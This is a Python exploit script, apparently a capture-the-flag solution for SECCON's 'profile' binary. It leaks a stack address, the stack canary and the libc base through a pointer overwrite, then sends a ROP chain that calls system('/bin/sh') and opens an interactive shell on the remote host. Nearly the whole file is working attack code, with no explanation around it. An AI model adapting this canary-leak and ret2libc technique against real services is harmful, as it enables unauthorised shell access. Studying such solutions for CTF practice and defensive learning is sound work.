#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import re

bin_file = './profile'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'profile.pwn.seccon.jp', 'port':28553})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    prof = Profile(conn, 'a'*8, 0, 'x')

    for i in range(0, 0x100, 8):
        prof.update('X'*0x10+chr(i))
        if prof.show()['Name'] == 'a'*8:
            x = i-0x10

    prof.update('X'*0x10+chr(x))
    addr_stack = u(prof.show()['Name'])
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    prof.update('X'*0x10+p64(addr_stack+0x28))
    canary = u(prof.show()['Name'])
    info('canary            = 0x{:08x}'.format(canary))

    prof.update('X'*0x10+p64(addr_stack+0x48))
    addr_libc_main = u(prof.show()['Name']) - 0xf0
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    rop = ROP(binf)

    exploit  = 'X'*0x10
    exploit += p64(addr_stack + 0x10)
    exploit += 'Y'*0x20
    exploit += p64(canary)
    exploit += 'Z'*0x18
    exploit += p64(rop.rdi.address)
    exploit += p64(addr_libc_str_sh)
    exploit += p64(addr_libc_system)
    prof.update(exploit)

    conn.sendlineafter('>> ', '0')
    
class Profile:
    def __init__(self, conn, name, age, msg):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

        self.sendlineafter('Name >> ', name)
        self.sendlineafter('Age >> ', str(age))
        self.sendlineafter('Message >> ', msg)

    def update(self, msg):
        self.sendlineafter('>> ', '1')
        self.sendlineafter('message >> ', msg)

    def show(self):
        self.sendlineafter('>> ', '2')
        data = self.recvuntil('\n\n', drop=True)
        data = re.findall(r'(.*) : (.*)', data)
        return dict(data)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
